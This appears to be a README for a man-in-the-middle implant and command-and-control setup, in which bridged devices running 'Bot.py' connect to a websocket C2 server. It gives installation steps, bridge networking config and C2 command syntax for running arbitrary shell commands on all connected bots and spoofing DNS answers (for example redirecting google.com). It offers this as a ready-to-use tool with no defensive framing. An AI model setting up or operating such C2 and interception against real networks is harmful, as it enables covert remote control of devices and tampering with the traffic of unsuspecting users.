This project you are assumes that you are using a system with 2 or more network interfaces in bridged mode. The original design was based on an OrangePi R1 http://www.orangepi.org/OrangePiR1/

> Dependency Linux Kernel > 3.18 & br_netfilter.
If you are using kernel < 3.18 comment out lines 81 & 82 in Bot.py

``` python
os.system('modprobe br_netfilter')
os.system('echo "1" > /proc/sys/net/bridge/bridge-nf-call-iptables')
```

# Setup Instructions

### Dependency:

 - apt install git python-pip bridge-utils build-essential python-dev libnetfilter-queue-dev

## c2 Server Setup Instructions

 - pip install git+https://github.com/dpallot/simple-websocket-server.git
 - pip install setuptools
 - python Server.py

### C2 Commands:
 - ? for help
 - i for bot list
 - x to terminate c2
 - cmd=XXX to terminate all bots
 - cmd=0_XXX to terminate botid == 0
 - cmd=ps -aux (this will execute "ps -aux" on all connected bots)
 - cmd=0_ps -aux (this will execute "ps -aux" on the bot id 0)
 - cmd=0_spoofdns=google.com:1.2.3.4


## MITM Node Setup Instructions

 - pip install NetfilterQueue websocket-client scapy
 - Setup bridge networking https://wiki.debian.org/BridgeNetworkConnections

```
auto br0
iface br0 inet dhcp
        bridge_ports eth0 eth1
        bridge_stp off
        bridge_fd 0
        bridge_maxwait 0
```

 - Modify config.py to point node to your c2 instance
 ``` python
 WS_SERVER = "ws://127.0.0.1:8080/"
 ```
 - sudo python Bot.py
